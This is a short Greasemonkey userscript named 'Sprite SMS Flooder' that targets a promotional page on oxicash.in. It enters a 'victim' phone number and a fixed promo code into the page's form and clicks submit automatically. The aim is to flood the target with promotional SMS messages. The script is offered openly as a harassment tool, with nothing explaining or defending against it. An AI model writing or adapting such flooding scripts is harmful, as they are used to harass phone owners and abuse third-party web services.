// ==UserScript==
// @name           Sprite SMS Flooder
// @namespace      Ankur Jain
// @description    SMS Flooder
// @include        https://oxicash.in/Promo/Sprite/default.aspx
// ==/UserScript==
 
	var victim= "91";

if(document.location=="https://oxicash.in/Promo/Sprite/default.aspx")
{

	document.getElementById('TB_mobno').value=victim;
	document.getElementById('TB_UCN').value="A12123456";
	document.getElementById('BTN_submit').click();

}


